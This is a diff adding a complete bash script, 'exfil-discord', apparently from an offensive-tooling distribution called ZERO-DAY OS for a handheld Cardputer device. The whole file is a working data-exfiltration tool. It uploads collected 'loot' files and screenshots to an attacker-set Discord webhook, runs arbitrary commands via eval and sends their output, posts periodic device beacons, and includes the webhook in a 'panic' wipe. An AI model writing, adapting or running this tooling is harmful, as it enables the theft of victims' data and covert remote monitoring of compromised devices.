@@ -1,0 +1,297 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/exfil-discord
+# Discord webhook exfiltration for ZERO-DAY OS
+# Sends loot data, screenshots, and command output to Discord
+
+CONFIG_DIR="/opt/cardputer/config"
+WEBHOOK_FILE="${CONFIG_DIR}/discord_webhook.txt"
+LOOT_DIR="/opt/cardputer/loot"
+
+RED='\033[0;31m'
+CYAN='\033[0;36m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+usage() {
+    echo -e "${CYAN}exfil-discord${NC} — Discord Webhook Exfiltration for ZERO-DAY OS"
+    echo ""
+    echo "Usage: exfil-discord <command> [args]"
+    echo ""
+    echo "Commands:"
+    echo "  setup <webhook_url>       Set Discord webhook URL"
+    echo "  test                      Send test message"
+    echo "  send <message>            Send text message to Discord"
+    echo "  file <path>               Upload a file (up to 25MB)"
+    echo "  loot                       Upload all loot files"
+    echo "  screenshot                Capture and upload screenshot"
+    echo "  cmd <command>              Run command and send output"
+    echo "  status [interval]          Periodic status updates (seconds)"
+    echo "  alert <message>            Send high-priority alert"
+    echo "  clear                      Delete webhook config"
+    echo ""
+    echo "Security:"
+    echo "  Webhook URL is stored in ${WEBHOOK_FILE}"
+    echo "  Webhook is included in 'panic' wipe"
+    echo "  All messages include device identifier"
+}
+
+get_webhook() {
+    if [ ! -f "$WEBHOOK_FILE" ]; then
+        echo -e "${RED}[!] Discord webhook not configured.${NC}"
+        echo -e "${YELLOW}    Run: exfil-discord setup <webhook_url>${NC}"
+        exit 1
+    fi
+    cat "$WEBHOOK_FILE"
+}
+
+get_device_id() {
+    local hostname=$(hostname 2>/dev/null || echo "zeroday")
+    local mac=$(ip link show 2>/dev/null | grep -m1 ether | awk '{print $2}' | tr -d ':' || echo "unknown")
+    echo "${hostname}-${mac}"
+}
+
+send_message() {
+    local webhook="$1"
+    local message="$2"
+    local device_id
+    device_id=$(get_device_id)
+    
+    curl -s -X POST \
+        -H "Content-Type: application/json" \
+        -d "{\"content\":\"**[${device_id}]** ${message}\",\"username\":\"ZERO-DAY OS\"}" \
+        "$webhook" > /dev/null 2>&1
+    
+    return $?
+}
+
+send_file() {
+    local webhook="$1"
+    local filepath="$2"
+    local message="${3:-File from ZERO-DAY OS}"
+    
+    if [ ! -f "$filepath" ]; then
+        echo -e "${RED}[!] File not found: ${filepath}${NC}"
+        return 1
+    fi
+    
+    local size=$(stat -f%z "$filepath" 2>/dev/null || stat -c%s "$filepath" 2>/dev/null || echo "0")
+    if [ "$size" -gt 26214400 ]; then
+        echo -e "${YELLOW}[!] File too large (>25MB). Splitting not supported.${NC}"
+        return 1
+    fi
+    
+    local device_id
+    device_id=$(get_device_id)
+    
+    curl -s -X POST \
+        -F "file=@${filepath}" \
+        -F "payload_json={\"content\":\"**[${device_id}]** ${message}\",\"username\":\"ZERO-DAY OS\"}" \
+        "$webhook" > /dev/null 2>&1
+    
+    return $?
+}
+
+send_embed() {
+    local webhook="$1"
+    local title="$2"
+    local description="$3"
+    local color="${4:-16711680}"
+    local device_id
+    device_id=$(get_device_id)
+    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
+    
+    curl -s -X POST \
+        -H "Content-Type: application/json" \
+        -d "{\"embeds\":[{\"title\":\"${title}\",\"description\":\"${description}\",\"color\":${color},\"footer\":{\"text\":\"${device_id}\"},\"timestamp\":\"${timestamp}\"}],\"username\":\"ZERO-DAY OS\"}" \
+        "$webhook" > /dev/null 2>&1
+    
+    return $?
+}
+
+setup_webhook() {
+    local url="$1"
+    mkdir -p "$CONFIG_DIR"
+    echo "$url" > "$WEBHOOK_FILE"
+    chmod 600 "$WEBHOOK_FILE"
+    
+    # Test the webhook
+    local webhook
+    webhook=$(cat "$WEBHOOK_FILE")
+    if send_message "$webhook" "Webhook configured successfully! :white_check_mark:"; then
+        echo -e "${GREEN}[+] Discord webhook configured and tested${NC}"
+    else
+        echo -e "${RED}[!] Webhook test failed. Check the URL.${NC}"
+    fi
+}
+
+send_loot() {
+    local webhook
+    webhook=$(get_webhook)
+    
+    local count=0
+    for dir in "$LOOT_DIR"/*/; do
+        [ -d "$dir" ] || continue
+        for f in "$dir"*; do
+            [ -f "$f" ] || continue
+            local basename=$(basename "$f")
+            local size=$(stat -c%s "$f" 2>/dev/null || echo "0")
+            
+            # Skip files > 25MB
+            if [ "$size" -gt 26214400 ]; then
+                echo -e "${YELLOW}[-] Skipping ${basename} (too large: ${size} bytes)${NC}"
+                continue
+            fi
+            
+            echo -ne "${CYAN}[*] Uploading ${basename}...${NC} "
+            if send_file "$webhook" "$f" "Loot: ${basename}"; then
+                echo -e "${GREEN}OK${NC}"
+                count=$((count + 1))
+            else
+                echo -e "${RED}FAILED${NC}"
+            fi
+            
+            # Rate limit: 500ms between uploads
+            sleep 0.5
+        done
+    done
+    
+    echo -e "${GREEN}[+] Uploaded ${count} files to Discord${NC}"
+}
+
+send_screenshot() {
+    local webhook
+    webhook=$(get_webhook)
+    local screenshot="/tmp/zeroday_screenshot_$(date +%Y%m%d_%H%M%S).png"
+    
+    # Try different screenshot methods
+    if command -v scrot &>/dev/null; then
+        scrot "$screenshot" 2>/dev/null
+    elif command -v import &>/dev/null; then
+        import -window root "$screenshot" 2>/dev/null
+    elif command -v fbgrab &>/dev/null; then
+        fbgrab "$screenshot" 2>/dev/null
+    else
+        # Fallback: use ffmpeg to grab framebuffer
+        if [ -e /dev/fb0 ]; then
+            ffmpeg -f fbdev -i /dev/fb0 -frames:v 1 -y "$screenshot" 2>/dev/null
+        else
+            echo -e "${RED}[!] No screenshot method available${NC}"
+            return 1
+        fi
+    fi
+    
+    if [ -f "$screenshot" ]; then
+        send_file "$webhook" "$screenshot" "Screenshot"
+        rm -f "$screenshot"
+    fi
+}
+
+send_command_output() {
+    local webhook
+    webhook=$(get_webhook)
+    local cmd="$1"
+    
+    echo -e "${CYAN}[*] Running: ${cmd}${NC}"
+    local output
+    output=$(eval "$cmd" 2>&1 | head -c 1900)  # Discord limit ~2000 chars
+    
+    send_message "$webhook" "Command output for \`${cmd}\`:\n\`\`\`\n${output}\n\`\`\`"
+    echo -e "${GREEN}[+] Output sent to Discord${NC}"
+}
+
+send_status() {
+    local webhook
+    webhook=$(get_webhook)
+    local device_id
+    device_id=$(get_device_id)
+    local hostname=$(hostname)
+    local uptime_str=$(uptime -p 2>/dev/null || echo "unknown")
+    local ram=$(free -m 2>/dev/null | awk '/Mem:/{printf "%d/%d MB", $3, $2}' || echo "unknown")
+    local disk=$(df -h / 2>/dev/null | awk 'NR==2{printf "%s/%s", $3, $2}' || echo "unknown")
+    local battery=$(cardputer-battery 2>/dev/null | head -1 || echo "unknown")
+    local wifi=$(cardputer-wifi-toggle status 2>/dev/null || echo "unknown")
+    local ip=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
+    
+    local description="Hostname: ${hostname}\nUptime: ${uptime_str}\nRAM: ${ram}\nDisk: ${disk}\nBattery: ${battery}\nWiFi: ${wifi}\nIP: ${ip}"
+    
+    send_embed "$webhook" "Device Status: ${device_id}" "$description" 3447003  # Green
+}
+
+# Main
+mkdir -p "$LOOT_DIR"
+
+case "${1:-}" in
+    setup)
+        if [ -z "${2:-}" ]; then
+            echo -e "${RED}[!] Usage: exfil-discord setup <webhook_url>${NC}"
+            exit 1
+        fi
+        setup_webhook "$2"
+        ;;
+    test)
+        webhook=$(get_webhook)
+        send_message "$webhook" "Test message from ZERO-DAY OS :satellite:"
+        echo -e "${GREEN}[+] Test message sent${NC}"
+        ;;
+    send)
+        if [ -z "${2:-}" ]; then
+            echo -e "${RED}[!] Usage: exfil-discord send <message>${NC}"
+            exit 1
+        fi
+        webhook=$(get_webhook)
+        shift
+        send_message "$webhook" "$*"
+        ;;
+    file)
+        if [ -z "${2:-}" ]; then
+            echo -e "${RED}[!] Usage: exfil-discord file <path>${NC}"
+            exit 1
+        fi
+        webhook=$(get_webhook)
+        send_file "$webhook" "$2"
+        ;;
+    loot)
+        send_loot
+        ;;
+    screenshot)
+        send_screenshot
+        ;;
+    cmd)
+        if [ -z "${2:-}" ]; then
+            echo -e "${RED}[!] Usage: exfil-discord cmd <command>${NC}"
+            exit 1
+        fi
+        shift
+        send_command_output "$*"
+        ;;
+    status)
+        interval="${2:-0}"
+        if [ "$interval" -gt 0 ]; then
+            echo -e "${GREEN}[*] Periodic status every ${interval}s (Ctrl+C to stop)${NC}"
+            while true; do
+                send_status
+                sleep "$interval"
+            done
+        else
+            send_status
+        fi
+        ;;
+    alert)
+        if [ -z "${2:-}" ]; then
+            echo -e "${RED}[!] Usage: exfil-discord alert <message>${NC}"
+            exit 1
+        fi
+        webhook=$(get_webhook)
+        shift
+        send_embed "$webhook" "ALERT" "$*" 15158332  # Red
+        ;;
+    clear)
+        rm -f "$WEBHOOK_FILE"
+        echo -e "${GREEN}[+] Discord webhook removed${NC}"
+        ;;
+    *)
+        usage
+        ;;
+esac
